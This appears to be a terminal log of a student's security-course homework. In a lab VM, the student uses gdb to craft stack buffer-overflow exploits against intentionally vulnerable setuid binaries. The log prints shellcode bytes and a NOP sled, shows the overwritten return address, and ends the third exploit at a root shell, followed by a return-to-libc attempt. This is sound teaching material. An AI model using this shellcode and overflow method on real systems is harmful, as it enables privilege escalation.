0xbffffc8c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffc9c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffcac:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffcbc:	0xbffffb2c	0xbffffb2c	0xbffffe00	0x00000000
0xbffffccc:	0xb7e21637	0x00000002	0xbffffd64	0xbffffd70
0xbffffcdc:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffcec:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffcfc:	0xb7fbb000	0x00000000	0x32211e95	0x09f35085
0xbffffd0c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffd1c:	0x08048370	0x00000000	0xb7ff0010	0xb7fea880
0xbffffd2c:	0xb7fff000	0x00000002	0x08048370	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1309] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1318 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff81 "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff81 "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xbe02a64f	0x85d2a85f	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff81	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa0	0x080484c0	0xbfffff81	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xbe02a64f	0x85d2a85f	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) p/x p/x getenv("shellcode")Quit
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa0
(gdb) x/64x 0xbfffffa0-128
0xbfffff20:	0x00000001	0x00000019	0xbfffff5b	0x0000001a
0xbfffff30:	0x00000000	0x0000001f	0xbfffffef	0x0000000f
0xbfffff40:	0xbfffff6b	0x00000000	0x00000000	0x00000000
0xbfffff50:	0x00000000	0x00000000	0x80000000	0xa33ecb13
0xbfffff60:	0x2e9820fc	0x52c4a712	0x6902d2b1	0x00363836
0xbfffff70:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff80:	0x90909000	0x72727200	0x72727272	0x72727272
0xbfffff90:	0xffffa03d	0x687300bf	0x636c6c65	0x3d65646f
0xbfffffa0:	0x90909090	0xbfffffa8	0xdb31c031	0x80cd17b0
0xbfffffb0:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
0xbfffffc0:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
0xbfffffd0:	0xffdce880	0x622fffff	0x732f6e69	0x742f0068
0xbfffffe0:	0x742f706d	0x65677261	0x90003374	0x2f009090
0xbffffff0:	0x2f706d74	0x67726174	0x00337465	0x00000000
0xc0000000:	Cannot access memory at address 0xc0000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1318] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
[sudo] password for student: 
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1397 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:20
20	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484bd: file target3.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff81 "\220\220\220") at target3.c:10
10	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484bd in copyFourInts (target3.c:10); saved eip = 0x80484dc
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff81 "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804857b
0xbffffdc0:	0x000000ff	0x000000ff	0x000000ff	0x000000ff
0xbffffdd0:	0xbffffddc	0x080484dc	0xbfffff81	0xbffffde8
0xbffffde0:	0x08048517	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x6b4150b5	0x50915ea5	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
11	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484cb	0xbffffdc0	0xbfffff81	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa0	0x080484dc	0xbfffff81	0xbffffde8
0xbffffde0:	0x08048517	0xbfffff81	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x6b4150b5	0x50915ea5	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) p/x intvalues
$1 = {0x909090, 0x72727272, 0x72727272, 0x3d727272}
(gdb) p/x getenv("rrrrrrrrrrr")
$2 = 0xbfffff91
(gdb) q
A debugging session is active.

	Inferior 1 [process 1397] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1486 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:20
20	  if( argc != 2 )
(gdb) p/x getenv("shellcode")
$1 = 0xbfffff8f
(gdb) x/64x 0xbfffff8f-128
0xbfffff0f:	0x00000e00	0x0003e800	0x00001700	0x00000100
0xbfffff1f:	0x00001900	0xffff4b00	0x00001abf	0x00000000
0xbfffff2f:	0x00001f00	0xffffef00	0x00000fbf	0xffff5b00
0xbfffff3f:	0x000000bf	0x00000000	0x00000000	0x38be49e2
0xbfffff4f:	0x8746456c	0x05c3854c	0x92a3b13e	0x36383669
0xbfffff5f:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff6f:	0x41414100	0x41414141	0x41414141	0x41414141
0xbfffff7f:	0xffffa041	0x687300bf	0x636c6c65	0x3d65646f
0xbfffff8f:	0x41414141	0xbfffffa8	0xdb31c031	0x80cd17b0
0xbfffff9f:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
0xbfffffaf:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
0xbfffffbf:	0xffdce880	0x622fffff	0x732f6e69	0x742f0068
0xbfffffcf:	0x742f706d	0x65677261	0x41003374	0x41414141
0xbfffffdf:	0x41414141	0x41414141	0xa0414141	0x00bfffff
0xbfffffef:	0x706d742f	0x7261742f	0x33746567	0x00000000
0xbfffffff:	Cannot access memory at address 0xc0000000
(gdb) x/64x 0xbfffff97-128
0xbfffff17:	0x00001700	0x00000100	0x00001900	0xffff4b00
0xbfffff27:	0x00001abf	0x00000000	0x00001f00	0xffffef00
0xbfffff37:	0x00000fbf	0xffff5b00	0x000000bf	0x00000000
0xbfffff47:	0x00000000	0x38be49e2	0x8746456c	0x05c3854c
0xbfffff57:	0x92a3b13e	0x36383669	0x00000000	0x706d742f
0xbfffff67:	0x7261742f	0x33746567	0x41414100	0x41414141
0xbfffff77:	0x41414141	0x41414141	0xffffa041	0x687300bf
0xbfffff87:	0x636c6c65	0x3d65646f	0x41414141	0xbfffffa8
0xbfffff97:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffa7:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffb7:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffc7:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffd7:	0x41003374	0x41414141	0x41414141	0x41414141
0xbfffffe7:	0xa0414141	0x00bfffff	0x706d742f	0x7261742f
0xbffffff7:	0x33746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1486] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
ssh: connect to host localhost port 2224: Connection refused
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Dec  2 10:58:35 2019 from 10.0.2.2
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls /tmp
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-colord.service-FmAvwz             target0  target3
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-rtkit-daemon.service-3GqQfg       target1  target4
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-systemd-timesyncd.service-v7bTdm  target2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
(gdb) p execl
$2 = {<text variable, no debug info>} 0xb7eb9a80 <__GI_execl>
(gdb) q
A debugging session is active.

	Inferior 1 [process 1638] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
sploitEC: No such file or directory.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1684 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffeb4) at target4.c:16
16	  if( argc != 2 )
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffc1
(gdb) q
A debugging session is active.

	Inferior 1 [process 1684] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
$ whoami
student
$ 
$ q
/sh: 3: q: not found
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
$ ^C
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1735 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffeb4) at target4.c:16
16	  if( argc != 2 )
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7e52670 <__printf>
(gdb) q
A debugging session is active.

	Inferior 1 [process 1735] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ msfelfscan -p rt2
msfelfscan: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install msfelfscan
[sudo] password for student: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package msfelfscan
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install mselfscan
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package mselfscan
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ mselfscan -p rt2
mselfscan: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls /usr/share
a11y-profile-manager         gnome-online-accounts           nux
accounts                     gnome-session                   omf
accountsservice              gnome-shell                     onboard
aclocal                      gnome-software                  orca
acpi-support                 gnome-sudoku                    os-prober
activity-log-manager         gnome-user-share                p11-kit
adduser                      gnome-video-effects             package-data-downloads
adium                        gnome-vpn-properties            pam
aisleriot                    gnupg                           pam-configs
alsa                         gnupg2                          perl
alsa-base                    groff                           perl5
apparmor                     grub                            pixmaps
appdata                      grub-gfxpayload-lists           pkgconfig
app-info                     gst-plugins-base                pkg-config-crosswrapper
app-install                  gstreamer-1.0                   pkg-config-dpkghook
application-registry         gtk-doc                         plainbox-provider-checkbox
applications                 gtk-engines                     plainbox-provider-resource-generic
apport                       gtksourceview-3.0               plainbox-providers-1
apps                         guile                           plymouth
apturl                       gutenprint                      pnm2ppa
aspell                       gvfs                            polkit-1
avahi                        hal                             poppler
backgrounds                  hardening-includes              popularity-contest
base-files                   help                            ppd
base-passwd                  help-langpack                   ppp
bash-completion              hplip                           pulseaudio
binfmts                      hunspell                        pyshared
branding                     hwdata                          python
brltty                       hyphen                          python3
bug                          i18n                            python3-plainbox
build-essential              ibus                            python-apt
ca-certificates              ibus-table                      qt4
calendar                     icons                           qt5
ccsm                         ImageMagick-6                   qtchooser
checkbox-converged           im-config                       readline
click                        indicator-application           remmina
cogl                         indicator-power                 resolvconf
color                        indicators                      rhythmbox
colord                       info                            rsyslog
columbus1                    initramfs-tools                 seahorse
command-not-found            insserv                         secureboot
common-licenses              intel-gpu-tools                 session-migration
compiz                       intltool-debian                 sgml
compizconfig                 iptables                        sgml-base
consolefonts                 java                            shotwell
console-setup                kde4                            simple-scan
consoletrans                 keyrings                        snmp
content-hub                  language-selector               software-properties
cups                         language-support                sounds
dbus-1                       language-tools                  speech-dispatcher
debconf                      libaudio2                       ssl-cert
debhelper                    libc-bin                        system-config-printer
debianutils                  libdrm                          systemd
deja-dup                     libexttextcat                   sysv-rc
desktop-directories          libgnomekbd                     tabset
dh-python                    libgphoto2                      tcltk
dict                         libgweather                     telepathy
dictionaries-common          liblangtag                      terminfo
distro-info                  liblouis                        themes
djvu                         liblouisutdml                   thumbnailers
dns                          libnma                          totem
dnsmasq-base                 libnm-gtk                       transmission
doc                          libparse-debianchangelog-perl   ubuntu
doc-base                     libquvi-scripts                 ubuntu-drivers-common
dpkg                         libreoffice                     ubuntu-release-upgrader
emacs                        librevenge                      ufw
enchant                      libsensors4                     unattended-upgrades
eog                          libthai                         unity
evince                       libtimezonemap                  unity-control-center
evolution-data-server        libwacom                        unity-greeter
example-content              lightdm                         unity-scopes
file                         lintian                         unity-settings-daemon
file-roller                  linux-sound-base                unity-webapps
fontconfig                   locale                          update-manager
fonts                        locale-langpack                 update-notifier
foo2qpdl                     locales                         upstart
foo2zjs                      man                             url-dispatcher
gcc-5                        man-db                          usb-creator
gconf                        maven-repo                      usb_modeswitch
GConf                        media-player-info               vim
gcr-3                        menu                            vino
gdb                          metacity                        vte
gdm                          mime                            webbrowser-app
gedit                        mime-info                       X11
geoclue-providers            mimelnk                         xdiagnose
GeoIP                        misc                            xgreeters
gettext                      mobile-broadband-provider-info  xml
gettext-0.19.7               mousetweaks                     xml-core
ghostscript                  mozilla                         xsessions
glib-2.0                     myspell                         yelp
gnome                        mythes                          yelp-xsl
gnome-background-properties  nano                            zeitgeist
gnome-bluetooth              nautilus-share                  zenity
gnome-control-center         netpbm                          zoneinfo
gnome-mahjongg               nm-applet                       zsh
gnome-mines                  notify-osd
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) p RET
No symbol "RET" in current context.
(gdb) pop edp
Undefined command: "pop".  Try "help".
(gdb) q
A debugging session is active.

	Inferior 1 [process 1757] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd /tmp
student@5435-hw4-vm:/tmp$ vi
student@5435-hw4-vm:/tmp$ touch msfelfscan
student@5435-hw4-vm:/tmp$ vi msfelfscan 
student@5435-hw4-vm:/tmp$ ls -la
total 112
drwxrwxrwt 10 root    root    4096 Dec  2 12:28 .
drwxr-xr-x 23 root    root    4096 Nov 26 10:57 ..
drwxrwxrwt  2 root    root    4096 Dec  2 10:58 .font-unix
drwxrwxrwt  2 root    root    4096 Dec  2 10:58 .ICE-unix
-rw-rw-r--  1 student student 6836 Dec  2 12:28 msfelfscan
drwx------  3 root    root    4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-colord.service-FmAvwz
drwx------  3 root    root    4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-rtkit-daemon.service-3GqQfg
drwx------  3 root    root    4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-systemd-timesyncd.service-v7bTdm
-rwsr-xr-x  1 root    root    8580 Dec  2 11:31 target0
-rwsr-xr-x  1 root    root    9748 Dec  2 11:31 target1
-rwsr-xr-x  1 root    root    9968 Dec  2 11:31 target2
-rwsr-xr-x  1 root    root    9856 Dec  2 11:31 target3
-rwsr-xr-x  1 root    root    9744 Dec  2 11:31 target4
drwxrwxrwt  2 root    root    4096 Dec  2 10:58 .Test-unix
-r--r--r--  1 root    root      11 Dec  2 10:58 .X0-lock
drwxrwxrwt  2 root    root    4096 Dec  2 10:58 .X11-unix
drwxrwxrwt  2 root    root    4096 Dec  2 10:58 .XIM-unix
student@5435-hw4-vm:/tmp$ sudo chown root:root msfelfscan
student@5435-hw4-vm:/tmp$ ls -la
total 112
drwxrwxrwt 10 root root 4096 Dec  2 12:28 .
drwxr-xr-x 23 root root 4096 Nov 26 10:57 ..
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .font-unix
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .ICE-unix
-rw-rw-r--  1 root root 6836 Dec  2 12:28 msfelfscan
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-colord.service-FmAvwz
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-rtkit-daemon.service-3GqQfg
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-systemd-timesyncd.service-v7bTdm
-rwsr-xr-x  1 root root 8580 Dec  2 11:31 target0
-rwsr-xr-x  1 root root 9748 Dec  2 11:31 target1
-rwsr-xr-x  1 root root 9968 Dec  2 11:31 target2
-rwsr-xr-x  1 root root 9856 Dec  2 11:31 target3
-rwsr-xr-x  1 root root 9744 Dec  2 11:31 target4
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .Test-unix
-r--r--r--  1 root root   11 Dec  2 10:58 .X0-lock
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .X11-unix
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .XIM-unix
student@5435-hw4-vm:/tmp$ chmod +x msfelfscan
chmod: changing permissions of 'msfelfscan': Operation not permitted
student@5435-hw4-vm:/tmp$ sudo chmod +x msfelfscan
student@5435-hw4-vm:/tmp$ ls -la
total 112
drwxrwxrwt 10 root root 4096 Dec  2 12:28 .
drwxr-xr-x 23 root root 4096 Nov 26 10:57 ..
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .font-unix
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .ICE-unix
-rwxrwxr-x  1 root root 6836 Dec  2 12:28 msfelfscan
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-colord.service-FmAvwz
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-rtkit-daemon.service-3GqQfg
drwx------  3 root root 4096 Dec  2 10:58 systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-systemd-timesyncd.service-v7bTdm
-rwsr-xr-x  1 root root 8580 Dec  2 11:31 target0
-rwsr-xr-x  1 root root 9748 Dec  2 11:31 target1
-rwsr-xr-x  1 root root 9968 Dec  2 11:31 target2
-rwsr-xr-x  1 root root 9856 Dec  2 11:31 target3
-rwsr-xr-x  1 root root 9744 Dec  2 11:31 target4
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .Test-unix
-r--r--r--  1 root root   11 Dec  2 10:58 .X0-lock
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .X11-unix
drwxrwxrwt  2 root root 4096 Dec  2 10:58 .XIM-unix
student@5435-hw4-vm:/tmp$ ./msfelfscan -p rt2
Can't locate Pex/ELFInfo.pm in @INC (you may need to install the Pex::ELFInfo module) (@INC contains: /tmp/lib /etc/perl /usr/local/lib/i386-linux-gnu/perl/5.22.1 /usr/local/share/perl/5.22.1 /usr/lib/i386-linux-gnu/perl5/5.22 /usr/share/perl5 /usr/lib/i386-linux-gnu/perl/5.22 /usr/share/perl/5.22 /usr/local/lib/site_perl /usr/lib/i386-linux-gnu/perl-base .) at ./msfelfscan line 24.
BEGIN failed--compilation aborted at ./msfelfscan line 24.
student@5435-hw4-vm:/tmp$ which perl
/usr/bin/perl
student@5435-hw4-vm:/tmp$ ls
msfelfscan                                                                         target1
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-colord.service-FmAvwz             target2
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-rtkit-daemon.service-3GqQfg       target3
systemd-private-bc1a8e78f8be4720bf955c62d7a60f87-systemd-timesyncd.service-v7bTdm  target4
target0
student@5435-hw4-vm:/tmp$ cd ~
